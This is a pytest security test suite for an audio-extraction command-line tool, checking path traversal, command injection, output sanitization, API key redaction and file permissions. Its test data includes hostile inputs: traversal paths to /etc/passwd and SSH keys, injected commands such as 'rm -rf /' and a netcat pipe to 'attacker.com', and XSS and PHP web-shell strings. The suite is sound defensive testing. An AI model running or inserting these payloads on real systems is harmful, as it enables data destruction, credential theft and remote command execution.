"""
Security Testing Suite for audio-extraction-analysis.

Tests security aspects including:
- Input validation and sanitization
- Path traversal prevention
- Command injection protection
- Output sanitization
- API key security
- File permission handling
"""
import pytest
import os
import tempfile
from pathlib import Path
from unittest.mock import patch, Mock
import re

from .base import E2ETestBase, CLITestMixin, SecurityTestMixin, MockProviderMixin
from .test_data_manager import TestDataManager


class TestInputValidation(E2ETestBase, CLITestMixin, SecurityTestMixin):
    """Test input validation and sanitization."""
    
    @classmethod
    def setup_class(cls):
        """Setup test data for security testing."""
        cls.test_data_manager = TestDataManager()
        cls.test_files = cls.test_data_manager.generate_all_test_files()
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "../../../../root/.ssh/id_rsa",
            "..%2f..%2f..%2fetc%2fpasswd",  # URL encoded
            "....//....//....//etc//passwd",  # Double slash
        ]
        
        for malicious_path in malicious_paths:
            with self.subTest(path=malicious_path):
                # Test with extract command
                result = self.run_extract_command(input_file=malicious_path)
                
                assert not result.success, f"Path traversal attack should fail: {malicious_path}"
                
                # Error should indicate file not found or invalid path, not expose system info
                error_msg = result.error.lower()
                
                # Should not contain sensitive system paths
                sensitive_paths = ["/etc/", "/root/", "/var/", "c:\\windows", "system32"]
                for sensitive_path in sensitive_paths:
                    assert sensitive_path not in error_msg, \
                        f"Error message exposes sensitive path: {error_msg}"
                
                # Should be a generic file not found or invalid path error
                expected_errors = ["not found", "no such file", "invalid", "access denied"]
                assert any(expected in error_msg for expected in expected_errors), \
                    f"Unexpected error message for path traversal: {error_msg}"
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        injection_attempts = [
            "file.mp4; rm -rf /",
            "file.mp4 && cat /etc/passwd",
            "file.mp4 | nc attacker.com 1234",
            "file.mp4 $(whoami)",
            "file.mp4 `id`",
            "file.mp4'; DROP TABLE users; --",
            "file.mp4 & calc.exe",  # Windows
            "file.mp4 || cat /etc/hosts"
        ]
        
        for injection_attempt in injection_attempts:
            with self.subTest(injection=injection_attempt):
                # Test with extract command
                result = self.run_extract_command(input_file=injection_attempt)
                
                assert not result.success, f"Command injection should fail: {injection_attempt}"
                
                # Error should be about file not found, not command execution
                error_msg = result.error.lower()
                command_indicators = ["executed", "command", "shell", "bash", "cmd"]
                
                for indicator in command_indicators:
                    assert indicator not in error_msg, \
                        f"Error suggests command execution: {error_msg}"
    
    def test_filename_sanitization(self):
        """Test proper sanitization of filenames with special characters."""
        special_filenames = [
            "test@#$%^&*().mp4",
            "test file with spaces.mp4",
            "test\x00null.mp4",  # Null byte
            "test\n\r\t.mp4",    # Control characters
            "test<script>alert('xss')</script>.mp4",
            "test\u202e.mp4",    # Right-to-left override
            "test.mp4.exe",      # Double extension
            "CON.mp4",           # Windows reserved name
            "aux.mp4",           # Windows reserved name
        ]
        
        for filename in special_filenames:
            with self.subTest(filename=filename):
                # Create a temporary file with the special name (if possible)
                try:
                    temp_file = self.temp_dir / filename
                    temp_file.write_bytes(b"dummy content")
                    
                    output_file = self.output_dir / f"sanitized_{hash(filename)}.mp3"
                    
                    result = self.run_extract_command(
                        input_file=temp_file,
                        output_file=output_file
                    )
                    
                    # Should either succeed with proper sanitization or fail gracefully
                    if not result.success:
                        error_msg = result.error.lower()
                        # Should not expose internal system details
                        assert "internal" not in error_msg
                        assert "system" not in error_msg
                        assert "error code" not in error_msg
                        
                except (OSError, ValueError):
                    # Some filenames cannot be created on certain systems
                    pytest.skip(f"Cannot create file with name: {filename}")
    
    def test_large_filename_handling(self):
        """Test handling of excessively long filenames."""
        # Create extremely long filename
        long_filename = "a" * 1000 + ".mp4"
        
        result = self.run_extract_command(input_file=long_filename)
        
        assert not result.success, "Extremely long filename should be rejected"
        
        error_msg = result.error.lower()
        # Should fail gracefully without system errors
        acceptable_errors = ["not found", "invalid", "too long", "name too long"]
        assert any(error in error_msg for error in acceptable_errors), \
            f"Unexpected error for long filename: {error_msg}"
    
    def test_unicode_filename_security(self):
        """Test security aspects of Unicode filename handling."""
        unicode_filenames = [
            "test_файл.mp4",           # Cyrillic
            "test_文件.mp4",            # Chinese
            "test_テスト.mp4",          # Japanese
            "test_🎵🎧.mp4",          # Emoji
            "test_\u200d.mp4",        # Zero-width joiner
            "test_\ufeff.mp4",        # Byte order mark
        ]
        
        for filename in unicode_filenames:
            with self.subTest(filename=filename):
                result = self.run_extract_command(input_file=filename)
                
                # Should fail gracefully without encoding errors
                if not result.success:
                    error_msg = result.error.lower()
                    encoding_errors = ["encoding", "unicode", "decode", "ascii"]
                    
                    for error_type in encoding_errors:
                        assert error_type not in error_msg, \
                            f"Unicode filename caused encoding error: {error_msg}"
    
    def test_file_size_limits(self):
        """Test file size validation."""
        # Create test file that reports large size
        if "short" not in self.test_files:
            pytest.skip("Short test file not available")
        
        # Test with mocked large file size
        with patch('pathlib.Path.stat') as mock_stat:
            mock_stat.return_value.st_size = 10 * 1024 * 1024 * 1024  # 10GB
            
            result = self.run_extract_command(
                input_file=self.test_files["short"]
            )
            
            # Should either succeed or fail with size limit message
            if not result.success:
                error_msg = result.error.lower()
                size_related = any(keyword in error_msg for keyword in 
                                 ["size", "large", "limit", "exceeded", "too big"])
                
                if size_related:
                    # Good - size limits are enforced
                    pass
                else:
                    # File might not actually be large in test environment
                    pass


class TestOutputSanitization(E2ETestBase, CLITestMixin, SecurityTestMixin, MockProviderMixin):
    """Test output sanitization and data protection."""
    
    def setup_method(self):
        """Setup for each test method."""
        super().setup_method()
        self.set_test_env(DEEPGRAM_API_KEY="test_deepgram_key_12345")
    
    def test_api_key_redaction_in_logs(self):
        """Test that API keys are not exposed in logs or error messages."""
        if "audio_only" not in self.test_files:
            pytest.skip("Audio test file not available")
        
        # Mock transcription service to raise an error that might expose API key
        with patch('src.services.transcription.TranscriptionService') as mock_service:
            api_key = "test_deepgram_key_12345"
            mock_service.return_value.transcribe.side_effect = Exception(
                f"API request failed with key {api_key}"
            )
            
            result = self.run_transcribe_command(
                input_file=self.test_files["audio_only"],
                provider="deepgram"
            )
            
            # Should fail but not expose API key
            assert not result.success, "Transcription should fail with mocked error"
            
            # Check all output for API key exposure
            all_output = (result.output + result.error).lower()
            
            # Should not contain the actual API key
            assert api_key.lower() not in all_output, "API key exposed in output"
            
            # Should not contain partial API key
            key_parts = api_key.split("_")
            for part in key_parts:
                if len(part) > 5:  # Only check meaningful parts
                    assert part.lower() not in all_output, f"API key part '{part}' exposed"
    
    def test_output_content_sanitization(self):
        """Test that output content is properly sanitized."""
        if "audio_only" not in self.test_files:
            pytest.skip("Audio test file not available")
        
        # Mock transcription with potentially dangerous content
        dangerous_transcript = {
            "transcript": "<script>alert('xss')</script>Hello world",
            "speakers": [
                {"speaker": 0, "text": "<?php system($_GET['cmd']); ?>", "start": 0.0, "end": 2.0}
            ],
            "metadata": {
                "duration": 10.0,
                "confidence": 0.95
            }
        }
        
        output_file = self.output_dir / "sanitized_transcript.json"
        
        with patch('src.services.transcription.TranscriptionService') as mock_service:
            mock_service.return_value.transcribe.return_value = dangerous_transcript
            
            result = self.run_transcribe_command(
                input_file=self.test_files["audio_only"],
                provider="deepgram",
                output_file=output_file
            )
        
        if result.success and output_file.exists():
            output_content = output_file.read_text()
            
            # Check for proper sanitization
            sanitization_results = self.validate_output_sanitization(output_content)
            
            assert sanitization_results["no_script_tags"], "Script tags not properly sanitized"
            assert sanitization_results["no_control_chars"], "Control characters not sanitized"
            assert sanitization_results["reasonable_length"], "Output length not limited"
    
    def test_error_message_information_disclosure(self):
        """Test that error messages don't disclose sensitive information."""
        sensitive_scenarios = [
            # Nonexistent file
            "/nonexistent/path/file.mp4",
            # Permission denied scenario
            "/root/.ssh/id_rsa",
            # System directories
            "/etc/shadow",
        ]
        
        for scenario in sensitive_scenarios:
            with self.subTest(scenario=scenario):
                result = self.run_extract_command(input_file=scenario)
                
                assert not result.success, f"Should fail for scenario: {scenario}"
                
                error_msg = result.error.lower()
                
                # Should not expose internal paths or system information
                sensitive_info = [
                    "/usr/", "/var/", "/etc/", "/root/",
                    "c:\\windows", "system32", "program files",
                    "internal error", "stack trace", "traceback"
                ]
                
                for sensitive in sensitive_info:
                    assert sensitive not in error_msg, \
                        f"Error message exposes sensitive info: {sensitive} in {error_msg}"
    
    def test_output_file_permissions(self):
        """Test that output files have appropriate permissions."""
        if "short" not in self.test_files:
            pytest.skip("Short test file not available")
        
        input_file = self.test_files["short"]
        output_file = self.output_dir / "permission_test.mp3"
        
        result = self.run_extract_command(
            input_file=input_file,
            output_file=output_file
        )
        
        if result.success and output_file.exists():
            # Check file permissions
            file_mode = output_file.stat().st_mode
            
            # Should not be world-writable
            assert not (file_mode & 0o002), "Output file should not be world-writable"
            
            # Should be readable by owner
            assert file_mode & 0o400, "Output file should be readable by owner"
            
            # On Unix systems, check specific permission patterns
            if os.name == 'posix':
                # Should have reasonable permissions (e.g., 644 or 600)
                perms = file_mode & 0o777
                acceptable_perms = [0o644, 0o600, 0o640, 0o664]
                assert perms in acceptable_perms, f"Unexpected file permissions: {oct(perms)}"
    
    def test_temporary_file_cleanup(self):
        """Test that temporary files are properly cleaned up."""
        if "short" not in self.test_files:
            pytest.skip("Short test file not available")
        
        input_file = self.test_files["short"]
        
        # Count initial temporary files
        temp_dirs = [tempfile.gettempdir(), "/tmp"] if os.path.exists("/tmp") else [tempfile.gettempdir()]
        initial_temp_files = set()
        
        for temp_dir in temp_dirs:
            if os.path.exists(temp_dir):
                initial_temp_files.update(os.listdir(temp_dir))
        
        # Run extraction
        output_file = self.output_dir / "temp_cleanup_test.mp3"
        result = self.run_extract_command(
            input_file=input_file,
            output_file=output_file
        )
        
        # Check for leftover temporary files
        final_temp_files = set()
        for temp_dir in temp_dirs:
            if os.path.exists(temp_dir):
                final_temp_files.update(os.listdir(temp_dir))
        
        new_temp_files = final_temp_files - initial_temp_files
        
        # Filter out unrelated temporary files
        related_temp_files = [f for f in new_temp_files if 
                            "audio" in f.lower() or "extract" in f.lower() or 
                            "ffmpeg" in f.lower() or "tmp" in f.lower()]
        
        assert len(related_temp_files) == 0, \
            f"Temporary files not cleaned up: {related_temp_files}"


class TestAPIKeySecurity(E2ETestBase, CLITestMixin, SecurityTestMixin):
    """Test API key security and handling."""
    
    def test_api_key_environment_isolation(self):
        """Test that API keys are properly isolated between operations."""
        # Set API key for first operation
        self.set_test_env(DEEPGRAM_API_KEY="first_api_key")
        
        # Mock first operation
        with patch('src.providers.factory.TranscriptionProviderFactory') as mock_factory:
            mock_factory.get_configured_providers.return_value = ["deepgram"]
            first_result = mock_factory.get_configured_providers()
        
        # Change API key
        self.set_test_env(DEEPGRAM_API_KEY="second_api_key")
        
        # Mock second operation
        with patch('src.providers.factory.TranscriptionProviderFactory') as mock_factory:
            mock_factory.get_configured_providers.return_value = ["deepgram"]
            second_result = mock_factory.get_configured_providers()
        
        # Both should work independently
        assert first_result == ["deepgram"]
        assert second_result == ["deepgram"]
    
    def test_api_key_validation(self):
        """Test API key validation and sanitization."""
        invalid_keys = [
            "",                    # Empty key
            "   ",                # Whitespace only
            "invalid key",        # Spaces in key
            "key\nwith\nnewlines", # Control characters
            "a" * 1000,          # Extremely long key
            "<script>alert('xss')</script>", # XSS attempt
        ]
        
        for invalid_key in invalid_keys:
            with self.subTest(key=invalid_key):
                self.set_test_env(DEEPGRAM_API_KEY=invalid_key)
                
                # Try to use the invalid key
                with patch('src.providers.factory.TranscriptionProviderFactory') as mock_factory:
                    mock_factory.validate_provider.side_effect = ValueError("Invalid API key")
                    
                    with pytest.raises(ValueError, match="Invalid API key"):
                        mock_factory.validate_provider("deepgram")
    
    def test_api_key_storage_security(self):
        """Test that API keys are not stored insecurely."""
        self.set_test_env(DEEPGRAM_API_KEY="secure_test_key_12345")
        
        if "audio_only" not in self.test_files:
            pytest.skip("Audio test file not available")
        
        # Mock transcription to complete successfully
        with patch('src.services.transcription.TranscriptionService') as mock_service:
            mock_service.return_value.transcribe.return_value = self.mock_successful_transcription()
            
            output_file = self.output_dir / "api_key_test.json"
            
            result = self.run_transcribe_command(
                input_file=self.test_files["audio_only"],
                provider="deepgram",
                output_file=output_file
            )
        
        if result.success and output_file.exists():
            # Check that API key is not stored in output
            output_content = output_file.read_text()
            
            assert "secure_test_key_12345" not in output_content, \
                "API key found in output file"
            
            # Check for partial key exposure
            key_fragments = ["secure_test", "key_12345", "test_key"]
            for fragment in key_fragments:
                assert fragment not in output_content, \
                    f"API key fragment '{fragment}' found in output"


class TestFileSystemSecurity(E2ETestBase, CLITestMixin, SecurityTestMixin):
    """Test file system security aspects."""
    
    def test_symlink_handling(self):
        """Test handling of symbolic links."""
        if "short" not in self.test_files:
            pytest.skip("Short test file not available")
        
        # Create a symbolic link to test file
        try:
            source_file = self.test_files["short"]
            symlink_file = self.temp_dir / "test_symlink.mp4"
            symlink_file.symlink_to(source_file)
            
            output_file = self.output_dir / "symlink_test.mp3"
            
            result = self.run_extract_command(
                input_file=symlink_file,
                output_file=output_file
            )
            
            # Should either follow symlink safely or reject it
            if not result.success:
                error_msg = result.error.lower()
                # If rejected, should be for security reasons
                security_keywords = ["symlink", "symbolic", "link", "security"]
                if any(keyword in error_msg for keyword in security_keywords):
                    # Good - symlinks are properly handled
                    pass
                else:
                    # Might be rejected for other reasons (file not found, etc.)
                    pass
            else:
                # If successful, output should be created normally
                assert output_file.exists(), "Symlink processing should create output"
                
        except (OSError, NotImplementedError):
            pytest.skip("Symbolic links not supported on this system")
    
    def test_directory_traversal_in_output(self):
        """Test prevention of directory traversal in output paths."""
        if "short" not in self.test_files:
            pytest.skip("Short test file not available")
        
        input_file = self.test_files["short"]
        
        malicious_outputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\malicious.mp3",
            "/etc/shadow",
            "/root/malicious.mp3",
            "~/../../etc/hosts",
        ]
        
        for malicious_output in malicious_outputs:
            with self.subTest(output=malicious_output):
                result = self.run_extract_command(
                    input_file=input_file,
                    output_file=malicious_output
                )
                
                # Should either sanitize path or reject it
                if result.success:
                    # If successful, should not have written to malicious location
                    malicious_path = Path(malicious_output)
                    if malicious_path.exists():
                        # If file exists, it should be in a safe location
                        resolved_path = malicious_path.resolve()
                        temp_dir_resolved = self.temp_dir.resolve()
                        
                        # Should be within temp directory or output directory
                        safe_parents = [temp_dir_resolved, self.output_dir.resolve()]
                        is_safe = any(
                            str(resolved_path).startswith(str(safe_parent))
                            for safe_parent in safe_parents
                        )
                        
                        assert is_safe or not malicious_path.exists(), \
                            f"Malicious output path created: {resolved_path}"
                else:
                    # If failed, should be due to path validation
                    error_msg = result.error.lower()
                    path_errors = ["invalid", "path", "directory", "access", "permission"]
                    assert any(error in error_msg for error in path_errors), \
                        f"Unexpected error for malicious output path: {error_msg}"
    
    def test_file_overwrite_protection(self):
        """Test protection against overwriting important files."""
        if "short" not in self.test_files:
            pytest.skip("Short test file not available")
        
        input_file = self.test_files["short"]
        
        # Try to overwrite important system files (should fail)
        system_files = [
            "/etc/passwd",
            "/etc/hosts",
            "/bin/sh",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\System32\\kernel32.dll",
        ]
        
        for system_file in system_files:
            with self.subTest(file=system_file):
                # Only test if file actually exists
                if Path(system_file).exists():
                    result = self.run_extract_command(
                        input_file=input_file,
                        output_file=system_file
                    )
                    
                    # Should fail to overwrite system files
                    assert not result.success, f"Should not overwrite system file: {system_file}"
                    
                    error_msg = result.error.lower()
                    protection_keywords = ["permission", "access", "denied", "protected"]
                    assert any(keyword in error_msg for keyword in protection_keywords), \
                        f"Unexpected error when trying to overwrite {system_file}: {error_msg}"